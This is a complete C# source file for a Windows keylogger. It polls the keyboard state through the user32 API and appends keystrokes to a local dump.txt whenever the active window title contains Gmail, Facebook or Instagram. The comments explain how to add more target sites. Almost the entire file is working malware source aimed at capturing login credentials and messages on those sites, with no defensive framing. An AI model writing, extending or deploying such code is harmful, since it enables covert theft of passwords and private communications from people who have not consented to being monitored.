using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Linq;
using System.IO;


//All keylogged entries will be appended to the bin\Debug\net8.0-windows/dump.txt
// To increase the websites the keylogged program work for simply add the name of the main page header in the 'websites' array
//Note: this program only works with basic keys for special keys it simply will print '?'

public class Keylogger
{   //imports in the user32 windows API that handles UI elements
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i); //gets the state of the specific key i, encoded in binary MSB 1 = key is held down, LSB 1 = has been pressed since the most recent call

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow(); //gets the reference to the window currently active

    [DllImport("user32.dll")]
    static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount); //gets the header of the currently active window, accesses lpString and writes results in there


    public static void Main()
    {
        string path = Path.Combine(Directory.GetCurrentDirectory(), "dump.txt"); //gets path to dump.txt
        StreamWriter sw = new StreamWriter(path, true); //creates a new streamwriter object with mode: append so doesnt overwrite previous content
        sw.AutoFlush = true; 
        string[] websites = { "Gmail", "Facebook", "Instagram" };


        while (true)
        {
            IntPtr handle = GetForegroundWindow();
            StringBuilder buffer = new StringBuilder(256); //this is where the foreground window title is held in
            

            if (GetWindowText(handle, buffer, buffer.Capacity) > 0) //if there is a title
            {
                string browserName = buffer.ToString(); //extract title

                if (websites.Any(site => browserName.Contains(site))) //if any of the websites are contained in the browsername
                {
                    for (Int32 i = 0; i < 255; i++) //loops through all possible virtual keys
                    {

                        if ((GetAsyncKeyState(i) & 0x0001) != 0) //if key is pressed
                        {
                            if (i==0x1B) //Checks if presses esc
                            {
                                sw.Close();
                                Console.WriteLine("ESC pressed. Exiting..."); //exits program
                                return;
                            }

                            else {
                            
                            Keys character = (Keys)i; //gets the Key object from the number


                            switch(character)
                            {
                                case Keys.LShiftKey:
                                case Keys.RShiftKey:
                                case Keys.ShiftKey:
                                case Keys.Capital:
                                case Keys.Alt:
                                        break; //ignore 'silent' keys
                                case Keys.LButton:
                                case Keys.RButton:
                                case Keys.Back:
                                case Keys.Return:
                                case Keys.Tab:
                                case Keys.Space:
                                        sw.Write("\n");
                                        sw.Write(character.ToString()); //tracks keys
                                        sw.Write("\n");
                                    break;
                                default:
                                    bool shift = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0; //is shift held?
                                    bool caps = Control.IsKeyLocked(Keys.CapsLock); //is capslock being toggled
                                    bool upper = shift ^ caps; //whether it is an uppercase character depends on a XOR relationship between shift and capslock
                                    char c = '?'; //default value
                                    if (character >= Keys.D0 && character <= Keys.D9) //if key is a number
                                    {
                                        int offset = character - Keys.D0; //calculates offset from beginning key
                                        c = shift ? ")!@#$%^&*("[offset] : (char)('0' + offset); //replaces with either symbols or letters

                                    }
                                    else if (character >= Keys.A && character <= Keys.Z) //handles uppercase
                                    {
                                        c = (char)((upper ? 'A' : 'a') + (character - Keys.A));
                                    }

                                    sw.Write(c);

                                        break;

                            }
                            }
                            

                        }
                    }
                    
                }
            }

            Thread.Sleep(100); //polls every 100ms
        }
    }

}